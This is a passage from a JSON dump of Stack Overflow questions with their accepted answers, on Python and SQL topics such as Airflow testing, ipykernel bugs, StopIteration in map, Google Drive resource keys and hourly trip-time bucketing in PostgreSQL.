    "AcceptedAnswer": "The code have written is using Airflow 2.0 format of unit test. So when you upgraded to Airflow 2.2.3, the unit test requires you to create a dagrun before you create a test run.\nBelow is the sample code which worked for me:\nimport unittest\n\nimport pendulum\nfrom airflow import DAG\nfrom airflow.utils.state import DagRunState\nfrom airflow.utils.types import DagRunType\n\nfrom operators.test_operator import EvenNumberCheckOperator\n\nDEFAULT_DATE = pendulum.datetime(2022, 3, 4, tz='America/Toronto')\nTEST_DAG_ID = \"my_custom_operator_dag\"\nTEST_TASK_ID = \"my_custom_operator_task\"\n\n\nclass TestEvenNumberCheckOperator(unittest.TestCase):\n\n    def setUp(self):\n        super().setUp()\n        self.dag = DAG('test_dag4', default_args={'owner': 'airflow', 'start_date': DEFAULT_DATE})\n        self.even = 10\n        self.odd = 11\n        EvenNumberCheckOperator(\n            task_id=TEST_TASK_ID,\n            my_operator_param=self.even,\n            dag=self.dag\n        )\n\n\n    def test_even(self):\n        \"\"\"Tests that the EvenNumberCheckOperator returns True for 10.\"\"\"\n        dagrun = self.dag.create_dagrun(state=DagRunState.RUNNING,\n                                        execution_date=DEFAULT_DATE,\n                                        #data_interval=DEFAULT_DATE,\n                                        start_date=DEFAULT_DATE,\n                                        run_type=DagRunType.MANUAL)\n        ti = dagrun.get_task_instance(task_id=TEST_TASK_ID)\n        ti.task = self.dag.get_task(task_id=TEST_TASK_ID)\n        result = ti.task.execute(ti.get_template_context())\n        assert result is True\n\n"
}
{
    "Id": 71099818,
    "PostTypeId": 1,
    "Title": "WebSocket not working when trying to send generated answer by keras",
    "Body": "I am implementing a simple chatbot using keras and WebSockets. I now have a model that can make a prediction about the user input and send the according answer.\nWhen I do it through command line it works fine, however when I try to send the answer through my WebSocket, the WebSocket doesn't even start anymore.\nHere is my working WebSocket code:\n@sock.route('/api')\ndef echo(sock):\n    while True:\n        # get user input from browser\n        user_input = sock.receive()\n        # print user input on console\n        print(user_input)\n        # read answer from console\n        response = input()\n        # send response to browser\n        sock.send(response)\n\nHere is my code to communicate with the keras model on command line:\nwhile True:\n    question = input(\"\")\n    ints = predict(question)\n    answer = response(ints, json_data)\n    print(answer)\n\nUsed methods are those:\ndef predict(sentence):\n    bag_of_words = convert_sentence_in_bag_of_words(sentence)\n    # pass bag as list and get index 0\n    prediction = model.predict(np.array([bag_of_words]))[0]\n    ERROR_THRESHOLD = 0.25\n    accepted_results = [[tag, probability] for tag, probability in enumerate(prediction) if probability > ERROR_THRESHOLD]\n\n    accepted_results.sort(key=lambda x: x[1], reverse=True)\n\n    output = []\n    for accepted_result in accepted_results:\n        output.append({'intent': classes[accepted_result[0]], 'probability': str(accepted_result[1])})\n        print(output)\n    return output\n\n\ndef response(intents, json):\n    tag = intents[0]['intent']\n    intents_as_list = json['intents']\n    for i in intents_as_list:\n        if i['tag'] == tag:\n            res = random.choice(i['responses'])\n            break\n    return res\n\nSo when I start the WebSocket with the working code I get this output:\n * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)\n * Restarting with stat\n * Serving Flask app 'server' (lazy loading)\n * Environment: production\n   WARNING: This is a development server. Do not use it in a production deployment.\n   Use a production WSGI server instead.\n * Debug mode: on\n\nBut as soon as I have anything of my model in the server.py class I get this output:\n2022-02-13 11:31:38.887640: I tensorflow/core/common_runtime/pluggable_device/pluggable_device_factory.cc:305] Could not identify NUMA node of platform GPU ID 0, defaulting to 0. Your kernel may not have been built with NUMA support.\n2022-02-13 11:31:38.887734: I tensorflow/core/common_runtime/pluggable_device/pluggable_device_factory.cc:271] Created TensorFlow device (/job:localhost/replica:0/task:0/device:GPU:0 with 0 MB memory) -> physical PluggableDevice (device: 0, name: METAL, pci bus id: )\nMetal device set to: Apple M1\n\nsystemMemory: 16.00 GB\nmaxCacheSize: 5.33 GB\n\nIt is enough when I just have an import at the top like this: from chatty import response, predict - even though they are unused.\n",
    "AcceptedAnswerId": 71158506,
    "AcceptedAnswer": "I am devastated, I just wasted 2 days into the dumbest possible issue (and fix)\nI still had the\nwhile True:\n    question = input(\"\")\n    ints = predict(question)\n    answer = response(ints, json_data)\n    print(answer)\n\nin my model file, so the server didn't start. The fix was to delete it and now it works fine.\n"
}
{
    "Id": 71324369,
    "PostTypeId": 1,
    "Title": "Does time complexity change when two nested loops are re-written into a single loop?",
    "Body": "Is the time complexity of nested for, while, and if statements the same? Suppose a is given as an array of length n.\nfor _ in range(len(a)):\n    for _ in range(len(a)):\n        do_something\n\nThe for statement above will be O(n\u00b2).\ni = 0\nwhile i < len(a) * len(a):\n    do_something\n    i += 1\n\nAt first glance, the above loop can be thought of as O(n), but in the end I think that it is also O(n\u00b2).\nAm I right?\n",
    "AcceptedAnswerId": 71324413,
    "AcceptedAnswer": "\nAm I right?\n\nYes!\nThe double loop:\nfor _ in range(len(a)):\n    for _ in range(len(a)):\n        do_something\n\nhas a time complexity of O(n) * O(n) = O(n\u00b2) because each loop runs until n.\nThe single loop:\ni = 0\nwhile i < len(a) * len(a):\n    do_something\n    i += 1\n\nhas a time complexity of O(n * n) = O(n\u00b2), because the loop runs until i = n * n = n\u00b2.\n"
}
{
    "Id": 71116130,
    "PostTypeId": 1,
    "Title": "iPyKernel throwing \"TypeError: object NoneType can't be used in 'await' expression\"",
    "Body": "I know that several similar questions exist on this topic, but to my knowledge all of them concern an async code (wrongly) written by the user, while in my case it comes from a Python package.\nI have a Jupyter notebook whose first cell is\n! pip install numpy\n! pip install pandas\n\nand I want to automatically play the notebook using Papermill. No problem on my local machine (Windows 11 with Python 3.7): I install iPyKernel and Papermill and everything is fine.\nThe problem is when I try to do the same on my BitBucket pipeline (Python image 3-alpine, but it happens under different others); the first cell throws the following error:\nTraceback (most recent call last):\n  File \"/usr/local/lib/python3.7/site-packages/ipykernel/kernelbase.py\", line 461, in dispatch_queue\n    await self.process_one()\n  File \"/usr/local/lib/python3.7/site-packages/ipykernel/kernelbase.py\", line 450, in process_one\n    await dispatch(*args)\nTypeError: object NoneType can't be used in 'await' expression\n\nthat makes the script stop at the 2nd cell, where I import numpy.\nIf it can be relevant, I've \"papermilled\" under the GitLab CI without any problem in the past.\n",
    "AcceptedAnswerId": 71218064,
    "AcceptedAnswer": "Seems to be a bug in ipykernel 6.9.0 - options that worked for me:\n\nupgrade to 6.9.1 (latest version as of 2022-02-22); e.g. via pip install ipykernel --upgrade\ndowngrade to 6.8.0 (if upgrading messes with other dependencies you might have); e.g. via pip install ipykernel==6.8.0\n\n"
}
{
    "Id": 71228643,
    "PostTypeId": 1,
    "Title": "MWAA Airflow 2.2.2 'DAG' object has no attribute 'update_relative'",
    "Body": "So I was upgrading DAGs from airflow version 1.12.15 to 2.2.2 and DOWNGRADING python from 3.8 to 3.7 (since MWAA doesn't support python 3.8). The DAG is working fine on the previous setup but shows this error on the MWAA setup:\nBroken DAG: [/usr/local/airflow/dags/google_analytics_import.py] Traceback (most recent call last):\n  File \"/usr/local/lib/python3.7/site-packages/airflow/models/baseoperator.py\", line 1474, in set_downstream\n    self._set_relatives(task_or_task_list, upstream=False, edge_modifier=edge_modifier)\n  File \"/usr/local/lib/python3.7/site-packages/airflow/models/baseoperator.py\", line 1412, in _set_relatives\n    task_object.update_relative(self, not upstream)\nAttributeError: 'DAG' object has no attribute 'update_relative'\n\nThis is the built-in function that seems to be failing:\n\ndef set_downstream(\n        self,\n        task_or_task_list: Union[TaskMixin, Sequence[TaskMixin]],\n        edge_modifier: Optional[EdgeModifier] = None,\n    ) -> None:\n        \"\"\"\n        Set a task or a task list to be directly downstream from the current\n        task. Required by TaskMixin.\n        \"\"\"\n        self._set_relatives(task_or_task_list, upstream=False, edge_modifier=edge_modifier)\n\nThere is the code we are trying to run in the DAG:\n    for report in reports:\n        dag << PythonOperator(\n            task_id=f\"task_{report}\",\n            python_callable=process,\n            op_kwargs={\n                \"conn\": \"snowflake_production\",\n                \"table\": report,\n            },\n            provide_context=True,\n        )\n\nI am thinking this transition from Python 3.8 to 3.7 is causing this issue but I am not sure.\nDid anyone run across a similar issue ?\n",
    "AcceptedAnswerId": 71234167,
    "AcceptedAnswer": "For Airflow>=2.0.0 Assigning task to a DAG using bitwise shift (bit-shift) operators are no longer supported.\nTrying to do:\ndag = DAG(\"my_dag\")\ndummy = DummyOperator(task_id=\"dummy\")\n\ndag >> dummy\n\nWill not work.\nDependencies should be set only between operators.\nYou should use context manager:\nwith DAG(\"my_dag\") as dag:\n    dummy = DummyOperator(task_id=\"dummy\")\n\nIt already handles the relations of operator to DAG object.\nIf you prefer not to, then use the dag parameter in the operator constructor as: DummyOperator(task_id=\"dummy\", dag=dag)\n"
}
{
    "Id": 71351209,
    "PostTypeId": 1,
    "Title": "Why does `map` hide a `StopIteration`?",
    "Body": "I found a case when map() usage isn't equivalent to a list comprehension. It happens when next used as the first argument.\nFor example:\nl1 = [1, 2]\nl2 = ['hello', 'world']\niterators = [iter(l1), iter(l2)]\n\n# list comprehension\nvalues1 = [next(it) for it in iterators]\n# values1 = [1, \"hello\"]\nvalues2 = [next(it) for it in iterators]\n# values2 = [2, \"world\"]\nvalues3 = [next(it) for it in iterators]\n# raise StopIteration\n\nl1 = [1, 2]\nl2 = ['hello', 'world']\niterators = [iter(l1), iter(l2)]\n\n# map\nvalues1 = list(map(next, iterators))\n# values1 = [1, \"hello\"]\nvalues2 = list(map(next, iterators))\n# values2 = [2, \"world\"]\nvalues3 = list(map(next, iterators))\n# values3 = []\n# doesn't raise StopIteration\n\nAny other exceptions occur as they should.\nExample:\ndef divide_by_zero(value: int):\n    return value // 0\n\nl = [1, 2, 3]\nvalues = list(map(divide_by_zero, l))\n# raises ZeroDivisionError as expected\nvalues = [divide_by_zero(value) for value in l]\n# raises ZeroDivisionError as expected, too\n\nIt seems very strange. It works the same with Python 3.9 and Python 3.11.\nIt seems like map() works like this:\ndef map(func, iterator):\n    try:\n        while True:\n            item = next(iterator)\n            yield func(item)\n    except StopIteration:\n        pass\n\nbut I expected it to work like this:\ndef map(func, iterator):\n    while True:\n        try:\n            item = next(iterator)\n        except StopIteration:\n            break\n        yield func(item)\n\nIs it a bug?\n",
    "AcceptedAnswerId": 71351332,
    "AcceptedAnswer": "Try calling next on map:\n>>> >>> m = map(next, iterators)\n>>> next(m)\n1\n>>> next(m)\n'hello'\n>>> next(m)\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\nIt's list that sees StopIteration and uses it to stop building the list from what map yields.\nThe list comprehension, on the other hand, is building the list by iterating over iterators, not a particular iterator in that list. That is, next(it) is used to produce a value for the list, not to determine if we've reached the end of iterators.\n"
}
{
    "Id": 71343002,
    "PostTypeId": 1,
    "Title": "Downloading files from public Google Drive in python: scoping issues?",
    "Body": "Using my answer to my question on how to download files from a public Google drive I managed in the past to download images using their IDs from a python script and Google API v3 from a public drive using the following bock of code:\nfrom google_auth_oauthlib.flow import Flow, InstalledAppFlow\nfrom googleapiclient.discovery import build\nfrom googleapiclient.http import MediaFileUpload, MediaIoBaseDownload\nfrom google.auth.transport.requests import Request\nimport io\nimport re\nSCOPES = ['https://www.googleapis.com/auth/drive']\nCLIENT_SECRET_FILE = \"myjson.json\"\nauthorized_port = 6006 # authorize URI redirect on the console\nflow = InstalledAppFlow.from_client_secrets_file(CLIENT_SECRET_FILE, SCOPES)\ncred = flow.run_local_server(port=authorized_port)\ndrive_service = build(\"drive\", \"v3\", credentials=cred)\nregex = \"(?<=https://drive.google.com/file/d/)[a-zA-Z0-9]+\"\nfor i, l in enumerate(links_to_download):\n    url = l\n    file_id = re.search(regex, url)[0]\n    request = drive_service.files().get_media(fileId=file_id)\n    fh = io.FileIO(f\"file_{i}\", mode='wb')\n    downloader = MediaIoBaseDownload(fh, request)\n    done = False\n    while done is False:\n        status, done = downloader.next_chunk()\n        print(\"Download %d%%.\" % int(status.progress() * 100))\n\nIn the mean time I discovered pydrive and pydrive2, two wrappers around Google API v2 that allows to do very useful things such as listing files from folders and basically allows to do the same thing with a lighter syntax:\nfrom pydrive.auth import GoogleAuth\nfrom pydrive.drive import GoogleDrive\nimport io\nimport re\nCLIENT_SECRET_FILE = \"client_secrets.json\"\n\ngauth = GoogleAuth()\ngauth.LocalWebserverAuth()\ndrive = GoogleDrive(gauth)\nregex = \"(?<=https://drive.google.com/file/d/)[a-zA-Z0-9]+\"\nfor i, l in enumerate(links_to_download):\n    url = l\n    file_id = re.search(regex, url)[0]\n    file_handle = drive.CreateFile({'id': file_id})\n    file_handle.GetContentFile(f\"file_{i}\")\n\nHowever now whether I use pydrive or the raw API I cannot seem to be able to download the same files and instead I am met with:\ngoogleapiclient.errors.HttpError: \n\nI tried everything and registered 3 different apps using Google console it seems it might be (or not) a question of scoping (see for instance this answer, with apps having access to only files in my Google drive or created by this app). However I did not have this issue before (last year).\nWhen going to the Google console explicitly giving https://www.googleapis.com/auth/drive as a scope to the API mandates filling a ton of fields with application's website/conditions of use/confidentiality rules/authorized domains and youtube videos explaining the app. However I will be the sole user of this script.\nSo I could only give explicitly the following scopes:\n/auth/drive.appdata\n/auth/drive.file\n/auth/drive.install\n\nIs it because of scoping ? Is there a solution that doesn't require creating a homepage and a youtube video ?\nEDIT 1:\nHere is an example of links_to_download:\nlinks_to_download = [\"https://drive.google.com/file/d/fileID/view?usp=drivesdk&resourcekey=0-resourceKeyValue\"]\n\nEDIT 2:\nIt is super instable sometimes it works without a sweat sometimes it doesn't. When I relaunch the script multiple times I get different results. Retry policies are working to a certain extent but sometimes it fails multiple times for hours.\n",
    "AcceptedAnswerId": 71351780,
    "AcceptedAnswer": "Well thanks to the security update released by Google few months before. This makes the link sharing stricter and you need resource key as well to access the file in-addition to the fileId.\nAs per the documentation , You need to provide the resource key as well for newer links, if you want to access it in the header X-Goog-Drive-Resource-Keys as fileId1/resourceKey1.\nIf you apply this change in your code, it will work as normal. Example edit below:\nregex = \"(?<=https://drive.google.com/file/d/)[a-zA-Z0-9]+\"\nregex_rkey = \"(?<=resourcekey=)[a-zA-Z0-9-]+\"\nfor i, l in enumerate(links_to_download):\n    url = l\n    file_id = re.search(regex, url)[0]\n    resource_key = re.search(regex_rkey, url)[0]\n    request = drive_service.files().get_media(fileId=file_id)\n    request.headers[\"X-Goog-Drive-Resource-Keys\"] = f\"{file_id}/{resource_key}\"\n    fh = io.FileIO(f\"file_{i}\", mode='wb')\n    downloader = MediaIoBaseDownload(fh, request)\n    done = False\n    while done is False:\n        status, done = downloader.next_chunk()\n        print(\"Download %d%%.\" % int(status.progress() * 100))\n\nWell, the regex for resource key was something I quickly made, so cannot be sure on if it supports every case. But this provides you the solution.\nNow, you may have to listen to old and new links based on this and set the changes.\n"
}
{
    "Id": 71349515,
    "PostTypeId": 1,
    "Title": "How to find all possible uniform substrings of a string?",
    "Body": "I have a string like\naaabbbbcca\n\nAnd I'd like to parse all possible uniform substrings from that. So my expected substrings for this string are\n['a', 'aa', 'aaa', 'b', 'bb', 'bbb', 'bbbb', 'c', 'cc', 'a']\n\nI tried the following\nimport re\n\nprint(re.findall(r\"([a-z])(?=\\1*)\", \"aaabbbbcca\"))\n# Output: ['a', 'a', 'a', 'b', 'b', 'b', 'b', 'c', 'c', 'a']\n\nIs it possible trough regular expressions? If yes, then how?\n",
    "AcceptedAnswerId": 71349674,
    "AcceptedAnswer": "You can achieve what you need without a regex here:\nresult = []\ntext = \"aaabbbbcca\"\nprev = ''\nfor c in text:\n  if c == prev:\n    result.append(result[-1] + c)\n  else:\n    result.append(c)\n    prev = c\n \nprint(result)\n# => ['a', 'aa', 'aaa', 'b', 'bb', 'bbb', 'bbbb', 'c', 'cc', 'a']\n\nSee the Python demo.\nIn short, you can iterate over the string and append new item to a result list when the new char is not equal to the previous char, otherwise, append a new item with the value equal to the previous item + the same char concatenated to the value.\nWith regex, the best you can do is\nimport re\ntext = \"aaabbbbcca\"\nprint( [x.group(1) for x in re.finditer(r'(?=((.)\\2*))', text)] )\n# => ['aaa', 'aa', 'a', 'bbbb', 'bbb', 'bb', 'b', 'cc', 'c', 'a']\n\nSee this Python demo. Here, (?=((.)\\2*)) matches any location inside the string that is immediately preceded with any one char (other than line break chars if you do not use re.DOTALL option) that is followed with zero or more occurrences of the same char (capturing the char(s) into Group 1).\n"
}
{
    "Id": 71029876,
    "PostTypeId": 1,
    "Title": "How can I perform a type guard on a property of an object in Python",
    "Body": "PEP 647 introduced type guards to perform complex type narrowing operations using functions. If I have a class where properties can have various types, is there a way that I can perform a similar type narrowing operation on the property of an object given as the function argument?\nclass MyClass:\n    a: Optional[int]\n    b: Optional[str]\n    # Some other things\n\ndef someTypeGuard(my_obj: MyClass) -> ???:\n    return my_obj.a is not None\n\nI'm thinking it might be necessary for me to implement something to do with square brackets in type hints, but I really don't know where to start on this.\n",
    "AcceptedAnswerId": 71252167,
    "AcceptedAnswer": "TypeGuard annotations can be used to annotate subclasses of a class. If parameter types are specified for those classes, then MyPy will recognise the type narrowing operation successfully.\nclass MyClass:\n    a: Optional[int]\n    b: Optional[str]\n    # Some other things\n\n# Two hidden classes for the different types\nclass _MyClassInt(MyClass):\n    a: int\n    b: None\nclass _MyClassStr(MyClass):\n    a: None\n    b: str\n\n\ndef someTypeGuard(my_obj: MyClass) -> TypeGuard[_MyClassInt]:\n    \"\"\"Check if my_obj's `a` property is NOT `None`\"\"\"\n    return my_obj.a is not None\n\ndef someOtherTypeGuard(my_obj: MyClass) -> TypeGuard[_MyClassStr]:\n    \"\"\"Check if my_obj's `b` property is NOT `None`\"\"\"\n    return my_obj.b is not None\n\nSadly failure to narrow to one type doesn't automatically narrow to the other type, and I can't find an easy way to do this other than an assert someOtherTypeGuard(obj) in your else block.\nEven still this seems to be the best solution.\n"
}
{
    "Id": 71371909,
    "PostTypeId": 1,
    "Title": "How to calculate when one's 10000 day after his or her birthday will be",
    "Body": "I am wondering how to solve this problem with basic Python (no libraries to be used): How can I calculate when one's 10000 day after their birthday will be (/would be)?\nFor instance, given Monday 19/05/2008, the desired day is Friday 05/10/2035 (according to https://www.durrans.com/projects/calc/10000/index.html?dob=19%2F5%2F2008&e=mc2)\nSo far I have done the following script:\nyears = range(2000, 2050)\nlst_days = []\ncount = 0\ntot_days = 0\nfor year in years:\n    if((year % 400 == 0) or  (year % 100 != 0) and  (year % 4 == 0)):\n        lst_days.append(366)\n    else:\n        lst_days.append(365)\nwhile tot_days <= 10000:\n        tot_days = tot_days + lst_days[count]\n        count = count+1\nprint(count)\n\nWhich estimates the person's age after 10,000 days from their birthday (for people born after 2000). But how can I proceed?\n",
    "AcceptedAnswerId": 71372125,
    "AcceptedAnswer": "Using base Python packages only\nOn the basis that \"no special packages\" means you can only use base Python packages, you can use datetime.timedelta for this type of problem:\nimport datetime\n\nstart_date = datetime.datetime(year=2008, month=5, day=19)\n\nend_date = start_date + datetime.timedelta(days=10000)\n\nprint(end_date.date())\n\nWithout any base packages (and progressing to the problem)\nSide-stepping even base Python packages, and taking the problem forwards, something along the lines of the following should help (I hope!).\nStart by defining a function that determines if a year is a leap year or not:\ndef is_it_a_leap_year(year) -> bool:\n    \"\"\"\n    Determine if a year is a leap year\n\n    Args:\n        year: int\n\n    Extended Summary:\n        According to:\n            https://airandspace.si.edu/stories/editorial/science-leap-year\n        The rule is that if the year is divisible by 100 and not divisible by\n        400, leap year is skipped. The year 2000 was a leap year, for example,\n        but the years 1700, 1800, and 1900 were not.  The next time a leap year\n        will be skipped is the year 2100.\n    \"\"\"\n    if year % 4 != 0:\n\n        return False\n\n    if year % 100 == 0 and year % 400 != 0:\n\n        return False\n\n    return True\n\nThen define a function that determines the age of a person (utilizing the above to recognise leap years):\ndef age_after_n_days(start_year: int,\n                     start_month: int,\n                     start_day: int,\n                     n_days: int) -> tuple:\n    \"\"\"\n    Calculate an approximate age of a person after a given number of days,\n    attempting to take into account leap years appropriately.\n\n    Return the number of days left until their next birthday\n\n    Args:\n        start_year (int): year of the start date\n        start_month (int): month of the start date\n        start_day (int): day of the start date\n        n_days (int): number of days to elapse\n    \"\"\"\n\n    # Check if the start date happens on a leap year and occurs before the\n    # 29 February (additional leap year day)\n    start_pre_leap = (is_it_a_leap_year(start_year) and start_month < 3)\n\n    # Account for the edge case where you start exactly on the 29 February\n    if start_month == 2 and start_day == 29:\n\n        start_pre_leap = False\n\n    # Keep a running counter of age\n    age = 0\n\n    # Store the \"current year\" whilst iterating through the days\n    current_year = start_year\n\n    # Count the number of days left\n    days_left = n_days\n\n    # While there is at least one year left to elapse...\n    while days_left > 364:\n\n        # Is it a leap year?\n        if is_it_a_leap_year(current_year):\n\n            # If not the first year\n            if age > 0:\n\n                days_left -= 366\n\n            # If the first year is a leap year but starting after the 29 Feb...\n            elif age == 0 and not start_pre_leap:\n\n                days_left -= 365\n\n            else:\n\n                days_left -= 366\n\n        # If not a leap year...\n        else:\n\n            days_left -= 365\n\n        # If the number of days left hasn't dropped below zero\n        if days_left >= 0:\n\n            # Increment age\n            age += 1\n\n            # Increment year\n            current_year += 1\n\n    return age, days_left\n\nUsing your example, you can test the function with:\nage, remaining_days = age_after_n_days(start_year=2000, start_month=5, start_day=19, n_days=10000)\n\nNow you have the number of complete years that will elapse and the number of remaining days\nYou can then use the remaining_days to work out the exact date.\n"
}
{
    "Id": 71491982,
    "PostTypeId": 1,
    "Title": "how to segment and get the time between two dates?",
    "Body": "I have the following table:\nid | number_of _trip |      start_date      |      end_date       | seconds\n1     637hui           2022-03-10 01:20:00    2022-03-10 01:32:00    720  \n2     384nfj           2022-03-10 02:18:00    2022-03-10 02:42:00    1440\n3     102fiu           2022-03-10 02:10:00    2022-03-10 02:23:00    780\n4     948pvc           2022-03-10 02:40:00    2022-03-10 03:20:00    2400\n5     473mds           2022-03-10 02:45:00    2022-03-10 02:58:00    780\n6     103fkd           2022-03-10 03:05:00    2022-03-10 03:28:00    1380\n7     905783           2022-03-10 03:12:00             null           0 \n8     498wsq           2022-03-10 05:30:00    2022-03-10 05:48:00    1080\n\nI want to get the time that is driven for each hour, but if a trip takes the space of two hours, the time must be taken for each hour.\nIf the end of the trip has not yet finished, the end_date field is null, but it must count the time it is taking in the respective hours from start_date.\nI have the following query:\nSELECT time_bucket(bucket_width := INTERVAL '1 hour',ts := start_date, \"offset\" := '0 minutes') AS init_date,\n       sum(seconds) as seconds\n        FROM trips\n        WHERE start_date >= '2022-03-10 01:00:00' AND start_date <= '2022-03-10 06:00:00'\n        GROUP BY init_date\n        ORDER BY init_date;\n\nThe result is:\n|   init_date         | seconds \n  2022-03-10 01:00:00    720\n  2022-03-10 02:00:00    5400\n  2022-03-10 03:00:00    1380\n  2022-03-10 05:00:00    1080\n\nHowever I expect to receive a result like this:\n|   init_date         | seconds     solo como una ayuda visual\n  2022-03-10 01:00:00    720          id(1:720)\n  2022-03-10 02:00:00    4200         id(2: 1440 3: 780 4: 1200 5: 780)\n  2022-03-10 03:00:00    5460         id(4:1200 6:1380 7:2880)\n  2022-03-10 05:00:00    1080         id(8:1080)\n\nEDIT\nIf I replace the null the result is still unwanted:\n|   init_date       | seconds \n2022-03-10 01:00:00   720\n2022-03-10 02:00:00   5400\n2022-03-10 03:00:00   1380\n2022-03-10 05:00:00   1080\n\nI have been thinking about getting all the data and solving the problem with pandas. I'll try and post if I get the answer.\nEDIT\nMy previous result was not entirely correct, since there were hours left of a trip that has not yet finished, the correct result should be:\n       start_date  seconds\n0 2022-03-10 01:00:00      720\n1 2022-03-10 02:00:00     4200\n2 2022-03-10 03:00:00     5460\n3 2022-03-10 04:00:00     3600\n4 2022-03-10 05:00:00     4680\n\nNEW CODE\ndef bucket_count(bucket, data):\n    result = pd.DataFrame()\n    list_r = []\n\n    for row_bucket in bucket.to_dict('records'):\n        inicio = row_bucket['start_date']\n        fin = row_bucket['end_date']\n\n        df = data[\n                (inicio <= data['end_date']) & (inicio <= fin) & (data['start_date'] <= fin) & (data['start_date'] <= data['end_date'])\n        ]\n        df_dict = df.to_dict('records')\n\n        for row in df_dict:\n            seconds = 0\n            if row['start_date'] >= inicio and fin >= row['end_date']:\n                seconds = (row['end_date'] - row['start_date']).total_seconds()\n            elif row['start_date'] <= inicio <= row['end_date'] <= fin:\n                seconds = (row['end_date'] - inicio).total_seconds()\n            elif inicio <= row['start_date'] <= fin <= row['end_date']:\n                seconds = (fin - row['start_date']).total_seconds()\n            elif row['start_date'] < inicio and fin < row['end_date']:\n                seconds = (fin - inicio).total_seconds()\n\n            row['start_date'] = inicio\n            row['end_date'] = fin\n            row['seconds'] = seconds\n            list_r.append(row)\n\n    result = pd.DataFrame(list_r)\n    return result.groupby(['start_date'])[\"seconds\"].apply(lambda x: x.astype(int).sum()).reset_index()\n\n",
    "AcceptedAnswerId": 71846320,
    "AcceptedAnswer": "This can be done in plain sql (apart from time_bucket function), in a nested sql query:\nselect \n    interval_start, \n    sum(seconds_before_trip_ended - seconds_before_trip_started) as seconds\nfrom (\n    select \n        interval_start,\n        greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,\n        least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended\n    from (\n        select generate_series(\n            (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, \"offset\" := '0 minutes')) from trips),\n            (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), \"offset\" := '0 minutes')) from trips),\n            '1 hour') as interval_start) i\n    join trips t\n        on t.start_date <= i.interval_start + interval '1 hour'\n        and coalesce(t.end_date, '2022-03-10 06:00:00') >= interval_start\n    ) subq\ngroup by interval_start\norder by interval_start;\n\nThis gives me the following result:\n   interval_start    | seconds\n---------------------+---------\n 2022-03-10 01:00:00 |     720\n 2022-03-10 02:00:00 |    4200\n 2022-03-10 03:00:00 |    5460\n 2022-03-10 04:00:00 |    3600\n 2022-03-10 05:00:00 |    4680\n 2022-03-10 06:00:00 |       0\n(6 rows)\n\nExplanation\nLet's break the query down.\nIn the innermost query:\nselect generate_series(\n        (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, \"offset\" := '0 minutes')) from trips),\n        (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), \"offset\" := '0 minutes')) from trips),\n        '1 hour'\n    ) as interval_start\n\nwe generate a series of time interval starts - from minimal start_date value up to the maximal end_time value, truncated to full hours, with 1-hour step. Each boundary can obviously be replaced with an arbitrary datetime. Direct result of this query is the following:\n   interval_start\n---------------------\n 2022-03-10 01:00:00\n 2022-03-10 02:00:00\n 2022-03-10 03:00:00\n 2022-03-10 04:00:00\n 2022-03-10 05:00:00\n 2022-03-10 06:00:00\n(6 rows)\n\nThen, the middle-level query joins this series with the trips table, joining rows if and only if any part of the trip took place during the hour-long interval beginning at the time given by the 'interval_start' column:\nselect interval_start,\n    greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,\n    least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended\nfrom (\n    -- innermost query\n    select generate_series(\n        (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, \"offset\" := '0 minutes')) from trips),\n        (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), \"offset\" := '0 minutes')) from trips),\n        '1 hour'\n    ) as interval_start\n    -- innermost query end\n) intervals\njoin trips t\n    on t.start_date = intervals.interval_start\n\nThe two computed values represent respectively:\n\nseconds_before_trip_started - number of second passed between the beginning of the interval, and the beginning of the trip (or 0 if the trip begun prior to interval start). This is the time the trip didn't take place - thus we will be substructing it in the following step\nseconds_before_trip_ended - number of seconds passed between the end of the interval, and the end of the trip (or 3600 if the trip didn't end within concerned interval).\n\nThe outermost query substracts the two beformentioned fields, effectively computing the time each trip took in each interval, and sums it for all trips, grouping by interval:\nselect \n    interval_start, \n    sum(seconds_before_trip_ended - seconds_before_trip_started) as seconds\nfrom (\n-- middle-level query\n    select \n        interval_start,\n        greatest(0, extract(epoch from start_date - interval_start)::int) as seconds_before_trip_started,\n        least(3600, extract(epoch from coalesce(end_date, '2022-03-10 06:00:00') - interval_start)::int) as seconds_before_trip_ended\n    from (\n        select generate_series(\n            (select min(time_bucket(bucket_width := INTERVAL '1 hour', ts := start_date, \"offset\" := '0 minutes')) from trips),\n            (select max(time_bucket(bucket_width := INTERVAL '1 hour', ts := coalesce(end_date, '2022-03-10 06:00:00'), \"offset\" := '0 minutes')) from trips),\n            '1 hour') as interval_start) i\n    join trips t\n        on t.start_date <= i.interval_start + interval '1 hour'\n        and coalesce(t.end_date, '2022-03-10 06:00:00') >= interval_start\n-- middle-level query end\n    ) subq\ngroup by interval_start\norder by interval_start;\n\nAdditional grouping\nIn case we have another column in the table, and what we really need is the segmentation of the above result in respect to that column, we simply need to add it to the appropriate select and group by clauses (optionally to order by clause as well).\nSuppose there's an additional driver_id column in the trips table:\n id | number_of_trip |     start_date      |      end_date       | seconds | driver_id\n----+----------------+---------------------+---------------------+---------+-----------\n  1 | 637hui         | 2022-03-10 01:20:00 | 2022-03-10 01:32:00 |     720 |         0\n  2 | 384nfj         | 2022-03-10 02:18:00 | 2022-03-10 02:42:00 |    1440 |         0\n  3 | 102fiu         | 2022-03-10 02:10:00 | 2022-03-10 02:23:00 |     780 |         1\n  4 | 948pvc         | 2022-03-10 02:40:00 | 2022-03-10 03:20:00 |    2400 |         1\n  5 | 473mds         | 2022-03-10 02:45:00 | 2022-03-10 02:58:00 |     780 |         1\n  6 | 103fkd         | 2022-03-10 03:05:00 | 2022-03-10 03:28:00 |    1380 |         2\n  7 | 905783         | 2022-03-10 03:12:00 |                     |       0 |         2\n  8 | 498wsq         | 2022-03-10 05:30:00 | 2022-03-10 05:48:00 